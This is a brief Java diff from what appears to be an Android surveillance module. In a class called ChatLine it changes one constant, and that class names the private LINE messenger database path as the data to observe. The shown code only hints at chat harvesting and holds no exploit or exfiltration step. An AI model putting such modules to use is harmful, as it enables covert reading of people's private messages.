@@ -25,7 +25,7 @@ import com.android.networking.util.Check;
 public class ChatLine extends SubModuleChat {
 	private static final String TAG = "ChatLine";
 
-	private static final int PROGRAM = 0x01;
+	private static final int PROGRAM = 0x0b;
 	String pObserving = "line";
 	String dbFile = "/data/data/jp.naver.line.android/databases/naver_line";
 
